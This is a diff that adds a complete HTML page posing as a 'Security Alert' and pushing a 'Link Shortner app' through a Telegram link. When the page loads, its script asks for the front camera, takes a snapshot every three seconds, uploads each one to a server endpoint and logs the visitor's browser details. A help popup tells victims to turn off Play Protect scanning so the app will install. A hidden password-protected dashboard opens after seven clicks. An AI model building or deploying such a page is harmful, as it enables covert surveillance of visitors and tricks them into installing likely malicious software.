@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(30, 41, 59, 0.9);
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .warning-icon {
+            font-size: 60px;
+            color: #ef4444;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #ef4444;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #94a3b8;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        button {
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .download-btn {
+            background: #3b82f6;
+            color: white;
+        }
+        
+        .download-btn:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+        }
+        
+        .help-btn {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .help-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        
+        .camera-note {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        #clickCounter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .modal h3 {
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: #10b981;
+            color: white;
+        }
+        
+        .submit-btn:hover {
+            background: #059669;
+        }
+        
+        .error {
+            color: #f87171;
+            margin-bottom: 10px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="clickCounter">
+        Clicks: <span id="clickCount">0</span>/7
+    </div>
+    
+    <div class="container">
+        <div class="warning-icon">⚠️</div>
+        <h1>SECURITY ALERT DETECTED</h1>
+        <p class="subtitle">
+            Our system detected suspicious activities. For better experience, 
+            download our Link Shortner app by clicking the download button.
+        </p>
+        
+        <div class="buttons">
+            <button class="download-btn" onclick="downloadApp()">
+                📱 Download App
+            </button>
+            <button class="help-btn" onclick="showHelp()">
+                ❓ Facing Issue
+            </button>
+        </div>
+        
+        <p class="camera-note">
+            Note: This site uses your camera for security verification
+        </p>
+    </div>
+    
+    <!-- Password Modal -->
+    <div class="modal" id="passwordModal">
+        <div class="modal-content">
+            <h3>🔐 Enter Password</h3>
+            <div class="error" id="errorMessage"></div>
+            <input type="password" id="passwordInput" placeholder="Enter password">
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Verifying...</p>
+            </div>
+            <button class="submit-btn" onclick="verifyPassword()" id="submitBtn">
+                Access Dashboard
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        let clickCount = 0;
+        let cameraStream = null;
+        let captureInterval = null;
+        
+        // Show click counter
+        function updateClickCounter() {
+            document.getElementById('clickCount').textContent = clickCount;
+            document.getElementById('clickCounter').style.display = 'block';
+            
+            if (clickCount >= 7) {
+                showPasswordModal();
+                clickCount = 0;
+            }
+        }
+        
+        // Initialize camera
+        async function setupCamera() {
+            try {
+                console.log("Setting up camera...");
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+                
+                cameraStream = stream;
+                console.log("Camera access granted!");
+                
+                // Start capturing every 3 seconds
+                captureInterval = setInterval(captureImage, 3000);
+                
+                // Send success log to Telegram
+                logToTelegram("Camera activated successfully");
+                
+            } catch (error) {
+                console.error("Camera error:", error);
+                logError("Camera setup failed: " + error.message);
+            }
+        }
+        
+        // Capture image
+        async function captureImage() {
+            if (!cameraStream) return;
+            
+            try {
+                const video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.muted = true;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Send to server
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ image: imageData })
+                });
+                
+                // Cleanup
+                video.remove();
+                canvas.remove();
+                
+            } catch (error) {
+                console.error("Capture error:", error);
+            }
+        }
+        
+        // Show password modal
+        function showPasswordModal() {
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('passwordInput').focus();
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        // Hide modal
+        function hidePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            document.getElementById('passwordInput').value = '';
+        }
+        
+        // Verify password
+        async function verifyPassword() {
+            const password = document.getElementById('passwordInput').value;
+            const errorEl = document.getElementById('errorMessage');
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            
+            if (!password) {
+                showError("Please enter password");
+                return;
+            }
+            
+            // Show loading
+            submitBtn.style.display = 'none';
+            loading.style.display = 'block';
+            errorEl.style.display = 'none';
+            
+            try {
+                console.log("Sending password verification request...");
+                
+                const response = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ password: password })
+                });
+                
+                console.log("Response status:", response.status);
+                
+                const result = await response.json();
+                console.log("Response data:", result);
+                
+                if (result.success) {
+                    // Stop camera
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                    }
+                    
+                    // Save token
+                    localStorage.setItem('auth_token', result.token);
+                    localStorage.setItem('authenticated', 'true');
+                    
+                    // Redirect
+                    window.location.href = result.redirect;
+                    
+                } else {
+                    showError(result.message || "Wrong password!");
+                }
+                
+            } catch (error) {
+                console.error("Password verification error:", error);
+                showError("Network error. Please try again.");
+                
+                // Log error
+                logError("Password verify error: " + error.message);
+            } finally {
+                submitBtn.style.display = 'block';
+                loading.style.display = 'none';
+            }
+        }
+        
+        // Show error
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+        }
+        
+        // Download app
+        function downloadApp() {
+            window.open('https://t.me/example', '_blank');
+        }
+        
+        // Show help
+        function showHelp() {
+            alert(`📱 Installation Help:\n\n1. Go to Play Store\n2. Click profile icon\n3. Click Play Protect\n4. Turn OFF "Scan apps"`);
+        }
+        
+        // Log to Telegram
+        async function logToTelegram(message) {
+            try {
+                await fetch('/api/log-error', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        error: {
+                            page: 'index.html',
+                            message: message,
+                            location: 'log'
+                        }
+                    })
+                });
+            } catch (e) {
+                console.error("Log error:", e);
+            }
+        }
+        
+        // Log error
+        async function logError(message) {
+            await logToTelegram("ERROR: " + message);
+        }
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            setTimeout(setupCamera, 1000);
+            logToTelegram("Page loaded: " + navigator.userAgent);
+        });
+        
+        // Click counter
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('.modal')) return;
+            clickCount++;
+            updateClickCounter();
+        });
+        
+        // Close modal
+        document.getElementById('passwordModal').addEventListener('click', (e) => {
+            if (e.target.id === 'passwordModal') {
+                hidePasswordModal();
+            }
+        });
+        
+        // Enter key in password field
+        document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                verifyPassword();
+            }
+        });
+    </script>
+</body>
+          </html>
